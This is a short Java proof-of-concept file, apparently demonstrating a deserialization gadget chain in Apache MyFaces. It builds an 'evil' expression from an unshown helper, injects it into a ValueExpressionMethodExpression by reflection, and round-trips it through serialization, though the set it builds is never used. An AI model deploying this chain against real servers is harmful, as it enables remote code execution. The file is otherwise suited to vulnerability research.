package com.example.Myface;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression;

import javax.el.ValueExpression;
import java.util.HashSet;

public class POC_2 {

    public static void main(String[] args) throws Exception {
        ValueExpression normal = Share.getValueExpression();
        ValueExpression evil = Share.getEvilExpression();
        ValueExpressionMethodExpression expression = new ValueExpressionMethodExpression(normal);

        HashSet set = new HashSet();
        set.add(normal);

        ReflectionUtil.setField(expression, "valueExpression", evil);
        SerializeUtil.deserialize(SerializeUtil.serialize(evil));
    }

}
